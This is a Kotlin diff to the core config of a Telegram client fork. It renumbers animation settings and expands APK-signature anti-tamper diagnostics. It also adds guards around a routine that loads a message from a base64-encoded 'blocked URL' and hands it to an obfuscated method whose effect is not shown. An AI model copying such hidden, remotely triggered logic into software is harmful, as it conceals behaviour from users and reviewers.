@@ -59,9 +59,10 @@ object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
 
     /** General start */
     /** Animations start */
-    const val ANIMATION_SPRING = 0
-    const val ANIMATION_CLASSIC = 1
-    var springAnimation by sharedPreferences.int("CG_SpringAnimation", ANIMATION_SPRING)
+    const val ANIMATION_CLASSIC = 0
+    const val ANIMATION_SPRING = 1
+    const val ANIMATION_PIXEL = 2
+    var navigationAnimation by sharedPreferences.int("CG_NavigationAnimation", ANIMATION_SPRING)
 
     var actionbarCrossfade by sharedPreferences.boolean("CG_ActionbarCrossfade", false)
     var predictiveBack by sharedPreferences.boolean("CG_PredictiveBack", true)
@@ -152,16 +153,36 @@ object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
         check_signature = true
     }
 
+    var certDirOpened by sharedPreferences.boolean("CG_cert_dir_opened", false)
+    var certTotalFdScanned by sharedPreferences.int("CG_cert_total_fd_scanned", 0)
+    var certApkLikeFdSeen by sharedPreferences.int("CG_cert_apk_like_fd_seen", 0)
     var certFoundApkFd by sharedPreferences.boolean("CG_cert_found_apk_fd", false)
+    var certLastApkLikePath by sharedPreferences.string("CG_cert_last_apk_like_path", "")
     var certEmpty by sharedPreferences.boolean("CG_cert_empty", false)
     var certSize by sharedPreferences.long("CG_cert_size", 0L)
     var certCrc by sharedPreferences.long("CG_cert_crc", 0L)
+
     @JvmStatic
-    fun setCertDiagnostics(foundApkFd: Int, certEmpty: Int, certSize: Long, certCrc: Long) {
-        this.certFoundApkFd = foundApkFd != 0
-        this.certEmpty = certEmpty != 0
-        this.certSize = certSize
-        this.certCrc = certCrc
+    fun setCertDiagnostics(
+        dirOpened: Int,
+        totalFdScanned: Int,
+        apkLikeFdSeen: Int,
+        foundApkFd: Int,
+        lastApkLikePath: String,
+        certEmpty: Int,
+        certSize: Long,
+        certCrc: Long
+    ) {
+        if (!isPlayStoreBuild()) {
+            this.certDirOpened = dirOpened != 0
+            this.certTotalFdScanned = totalFdScanned
+            this.certApkLikeFdSeen = apkLikeFdSeen
+            this.certFoundApkFd = foundApkFd != 0
+            this.certLastApkLikePath = lastApkLikePath
+            this.certEmpty = certEmpty != 0
+            this.certSize = certSize
+            this.certCrc = certCrc
+        }
     }
     /** AppSec finish */
 
@@ -236,8 +257,12 @@ object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
     }
 
     private fun loadMessages() {
-        MessageLoader.loadMessageByLink(UserConfig.selectedAccount, DonatesManager.decodeBase64Array(Extra.TG_BLOCKED_URL), object : MessageLoader.Callback {
+        val account = UserConfig.selectedAccount
+        if (!UserConfig.getInstance(account).isClientActivated) return
+
+        MessageLoader.loadMessageByLink(account, DonatesManager.decodeBase64Array(Extra.TG_BLOCKED_URL), object : MessageLoader.Callback {
             override fun onLoaded(message: MessageObject?) {
+                if (message == null) return
                 launch(Dispatchers.IO) {
                     AutoBackupUserAgent.woifwfwif4343(message)
                 }
